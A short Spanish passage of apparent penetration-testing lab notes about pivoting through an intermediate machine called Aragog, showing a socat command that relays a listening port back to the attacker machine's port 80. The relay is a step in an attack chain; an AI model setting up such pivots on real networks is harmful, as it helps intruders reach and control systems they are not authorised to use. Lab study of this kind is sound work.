...
Para poder tener conectividad con nuestra maquina atacnte lo que haremos sera descargar `socat` y nos lo trasferiremos a la maquina intermedia [[192.168.1.23 (Aragog)]] [[10.10.0.4 (Aragog)]]
Le daremos permisos de ejecucion y ejecutarememos la herramineta de la siguinet forma:
`./socat TCP-LISTEN:4343,fork TCP:192.168.1.23:80`
Estamos indicando que todo lo que se pida por el puerto 4343 lo envie a traves de la ip de [[192.168.1.23 (Aragog)]] por el puerto 80
